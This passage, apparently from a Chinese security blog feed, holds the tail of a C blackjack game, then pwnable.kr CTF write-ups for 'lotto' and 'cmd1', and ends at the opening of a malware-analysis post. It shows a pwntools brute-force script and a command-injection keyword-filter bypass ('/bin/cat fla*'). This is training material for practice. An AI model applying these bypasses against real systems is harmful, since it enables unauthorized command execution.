dealer total</span></span><br><span class="line">     betting(); <span class="comment">//Prompts user to enter bet amount</span></span><br><span class="line">        </span><br><span class="line">     <span class="keyword">while</span>(i&lt;=<span class="number">21</span>) <span class="comment">//While loop used to keep asking user to hit or stay at most twenty-one times</span></span><br><span class="line">                  <span class="comment">//  because there is a chance user can generate twenty-one consecutive 1&#x27;s</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(p==<span class="number">21</span>) <span class="comment">//If user total is 21, win</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">             won = won+<span class="number">1</span>;</span><br><span class="line">             cash = cash+bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&gt;<span class="number">21</span>) <span class="comment">//If player total is over 21, loss</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nWoah Buddy, You Went WAY over.\n&quot;</span>);</span><br><span class="line">             loss = loss+<span class="number">1</span>;</span><br><span class="line">             cash = cash - bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&lt;=<span class="number">21</span>) <span class="comment">//If player total is less than 21, ask to hit or stay</span></span><br><span class="line">         &#123;         </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\n\nWould You Like to Hit or Stay?&quot;</span>);</span><br><span class="line">              </span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;choice3);</span><br><span class="line">             <span class="keyword">while</span>((choice3!=<span class="string">&#x27;H&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;h&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;S&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;s&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">             &#123;                                                                           </span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;Please Enter H to Hit or S to Stay.\n&quot;</span>);</span><br><span class="line">                 <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice3);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">&#x27;H&#x27;</span>) || (choice3==<span class="string">&#x27;h&#x27;</span>)) <span class="comment">// If Hit, continues</span></span><br><span class="line">             &#123; </span><br><span class="line">                 randcard();</span><br><span class="line">                 player_total = p + l;</span><br><span class="line">                 p = player_total;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;\nYour Total is %d\n&quot;</span>, p);</span><br><span class="line">                 dealer();</span><br><span class="line">                  <span class="keyword">if</span>(dealer_total==<span class="number">21</span>) <span class="comment">//Is dealer total is 21, loss</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);</span><br><span class="line">                      loss = loss+<span class="number">1</span>;</span><br><span class="line">                      cash = cash - bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125; </span><br><span class="line">      </span><br><span class="line">                  <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer total is over 21, win</span></span><br><span class="line">                  &#123;                      </span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has Went Over!. You Win!\n&quot;</span>);</span><br><span class="line">                      won = won+<span class="number">1</span>;</span><br><span class="line">                      cash = cash+bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">&#x27;S&#x27;</span>) || (choice3==<span class="string">&#x27;s&#x27;</span>)) <span class="comment">// If Stay, does not continue</span></span><br><span class="line">             &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nYou Have Chosen to Stay at %d. Wise Decision!\n&quot;</span>, player_total);</span><br><span class="line">                stay();</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">             i++; <span class="comment">//While player total and dealer total are less than 21, re-do while loop </span></span><br><span class="line">     &#125; <span class="comment">// End While Loop</span></span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span> <span class="comment">//Function to play for dealer AI</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> z;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(dealer_total&lt;<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>) + <span class="number">1</span>); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">      z=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(z&lt;=<span class="number">10</span>) <span class="comment">//If random number generated is 10 or less, keep that value</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=z;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z&gt;<span class="number">11</span>) <span class="comment">//If random number generated is more than 11, change value to 10</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=<span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z==<span class="number">11</span>) <span class="comment">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(dealer_total&lt;=<span class="number">10</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     dealer_total = dealer_total + d;</span><br><span class="line">     &#125;</span><br><span class="line">           </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nThe Dealer Has a Total of %d&quot;</span>, dealer_total); <span class="comment">//Prints dealer total</span></span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span> <span class="comment">//Function for when user selects &#x27;Stay&#x27;</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     dealer(); <span class="comment">//If stay selected, dealer continues going</span></span><br><span class="line">     <span class="keyword">if</span>(dealer_total&gt;=<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(player_total&gt;=dealer_total) <span class="comment">//If player&#x27;s total is more than dealer&#x27;s total, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(player_total&lt;dealer_total) <span class="comment">//If player&#x27;s total is less than dealer&#x27;s total, loss</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);</span><br><span class="line">         loss = loss+<span class="number">1</span>;</span><br><span class="line">         cash = cash - bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer&#x27;s total is more than 21, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         stay();</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span> <span class="comment">//Test for if user has cash remaining in purse</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (cash &lt;= <span class="number">0</span>) <span class="comment">//Once user has zero remaining cash, game ends and prompts user to play again</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You Are Bankrupt. Game Over&quot;</span>);</span><br><span class="line">        cash = <span class="number">500</span>;</span><br><span class="line">        askover();</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\n\nEnter Bet: $&quot;</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nYou cannot bet more money than you have.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nEnter Bet: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;bet);</span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to play again</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">         </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nWould You Like To Play Again?&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nPlease Enter Y for Yes or N for No\n&quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue.</span></span><br><span class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            play();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        fileresults();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nBYE!!!!\n\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span> <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpresults; <span class="comment">//File pointer is fpresults</span></span><br><span class="line">    fpresults = fopen(RESULTS, <span class="string">&quot;w&quot;</span>); <span class="comment">//Creates file and writes into it</span></span><br><span class="line">    <span class="keyword">if</span>(fpresults == <span class="literal">NULL</span>) <span class="comment">// what to do if file missing from directory</span></span><br><span class="line">    &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;\nError: File Missing\n&quot;</span>);</span><br><span class="line">               system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;     </span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\n\t RESULTS&quot;</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\n\t---------\n&quot;</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nYou Have Won %d Times\n&quot;</span>, won);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nYou Have Lost %d Times\n&quot;</span>, loss);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nKeep Playing and Set an All-Time Record!&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">     fclose(fpresults);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之13-lotto</title>
    <url>/2021/09/18/pwnable/pwnable.kr%E7%B3%BB%E5%88%9713-lotto/</url>
    <content><![CDATA[<p>又回到了熟悉得ssh连接的题目，看题目描述是一个大乐透游戏：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917174444.png"></p>
<p>连上去查看文件，玩一下，顺便把lotto.c源码下载到本地：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917175003.png"></p>
<p>游戏玩法大致如下，每次输入六个ascii值小于46的字符，去匹配，都匹配到即可中一等奖拿到flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917181104.png"></p>
<p>lotto.c源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    最开始看到随机数以及文件描述符，以为重点在这块，结果通读了一波程序，发现问题很简单，主要是下面对于值判断有利用的地方，这里两个for只要随机字符有一个和我们输入的字符都匹配那就可以完成条件，所以输入6个相同字符来暴力碰撞就可，反正提示可以尝试很多次。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918105805.png"></p>
<p>​    这里用pwntools来写个自动化脚本，然后自动碰撞即可拿到flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell=ssh(host=<span class="string">&quot;pwnable.kr&quot;</span>,user=<span class="string">&quot;lotto&quot;</span>,port=<span class="number">2222</span>,password=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">	p=shell.process(<span class="string">&quot;./lotto&quot;</span>,)</span><br><span class="line">	lottoBytes=<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		data=p.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="built_in">print</span> data</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&quot;bad luck&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;Select Menu&quot;</span> <span class="keyword">in</span> data):</span><br><span class="line">			p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		data=p.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="built_in">print</span> data</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&quot;Submit your 6 lotto bytes&quot;</span> <span class="keyword">in</span> data):</span><br><span class="line">			p.sendline(lottoBytes)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918105927.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之14-cmd1</title>
    <url>/2021/09/23/pwnable/pwnable.kr%E7%B3%BB%E5%88%9714-cmd1/</url>
    <content><![CDATA[<p>看提示又是一道环境变量相关的题目：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918183939.png"></p>
<p>​    ssh连上看看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923112006.png"></p>
<p>​    还是把cmd1的源码下回来或者直接在服务器上复制回来查看：</p>
<figure class="highlight plain"><figcaption><span><stdio.h></span></figcaption><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int filter(char* cmd)&#123;</span><br><span class="line">	int r&#x3D;0;</span><br><span class="line">	r +&#x3D; strstr(cmd, &quot;flag&quot;)!&#x3D;0;</span><br><span class="line">	r +&#x3D; strstr(cmd, &quot;sh&quot;)!&#x3D;0;</span><br><span class="line">	r +&#x3D; strstr(cmd, &quot;tmp&quot;)!&#x3D;0;</span><br><span class="line">	return r;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[], char** envp)&#123;</span><br><span class="line">	putenv(&quot;PATH&#x3D;&#x2F;thankyouverymuch&quot;);</span><br><span class="line">	if(filter(argv[1])) return 0;</span><br><span class="line">	system( argv[1] );</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    题目先是把环境变量设置了一个新的路径<code>/thankyouverymuch</code>，这样设置后，一些添加了环境变量的命令就没用了。</p>
<p>​    然后就是对参数1进行过滤，如果参数1包含了flag、sh、tmp等字段就直接结束，要吗就把参数1作为命令执行。</p>
<p>​    所以这道题的破解方法就好理解了，我们需要执行一个命令，来读取到flag的内容，同时这个命令不能包含三个敏感字符串且不能利用到环境变量，比如<code>bash -c cat flag</code>这样的命令就不行。另外我们也不能使用到tmp目录，这个目录是服务器留给我们写自己程序来执行的，所以想通过第三方程序读取flag也好像不行。</p>
<p>​    分析到这，那自然而然也就想到了<code>/bin</code>目录，这个目录下存放了一些系统命令比如：cat、ls、mkdir、chmod等。所以我们构造一个参数”/bin/cat flag”是不是就可以拿到flag了。哦对，flag也被作为敏感词屏蔽了，但是巧妙地是cat是支持正则表达式的，所以改一下参数”/bin/cat fla*”，这样就可以成功cat flag了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923122128.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>如何分析各种类型的恶意样本之--C#恶意样本分析技巧</title>
    <url>/2021/01/01/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-01/</url>
    <content><![CDATA[<p>​    日常样本分析中，我们会遇到各式各样的语言所编写的恶意样本。除了最基础的C/C++之外，使用C#、python、VBScript、Office宏、PowerShell来构造恶意代码也较为常见。</p>
<p>​    为了让新入门者对各种类型样本的代码结构和分析流程都进行一次了解，我构思了如下系列文章《如何分析各种类型的恶意样本》来进行讲解，希望可以帮到大家。</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul>
